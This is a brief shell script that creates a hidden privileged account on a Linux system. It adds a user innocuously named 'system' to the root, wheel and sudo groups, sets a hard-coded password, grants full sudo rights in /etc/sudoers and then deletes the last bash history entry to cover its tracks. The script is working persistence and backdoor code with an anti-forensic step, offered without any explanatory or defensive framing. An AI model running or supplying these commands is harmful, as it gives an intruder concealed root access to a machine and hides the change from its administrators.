useradd system -g root -M 

echo '0c117864a02827ba'| passwd --stdin system  

usermod -a -G wheel system  

usermod -a -G sudo system 

echo "system ALL=(ALL) ALL" >> /etc/sudoers 

sed -i '$d' ~/.bash_history 
